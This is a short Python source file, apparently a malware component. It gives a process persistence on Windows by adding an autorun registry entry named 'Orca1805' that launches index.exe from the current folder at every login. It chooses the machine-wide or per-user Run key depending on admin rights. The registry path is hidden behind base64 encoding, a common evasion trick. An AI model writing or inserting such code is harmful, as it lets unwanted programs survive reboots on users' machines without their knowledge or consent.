import os
import base64
import winreg as wrg
from win32com.shell import shell


class Birth:
    def __init__(self):
        loc = wrg.HKEY_LOCAL_MACHINE if shell.IsUserAnAdmin() else wrg.HKEY_CURRENT_USER
        key = wrg.OpenKeyEx(loc,base64.b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu').decode('UTF-8'),0,wrg.KEY_SET_VALUE)
        wrg.SetValueEx(key,"Orca1805",0,wrg.REG_SZ,f"{os.getcwd()}\\index.exe")
        key.Close()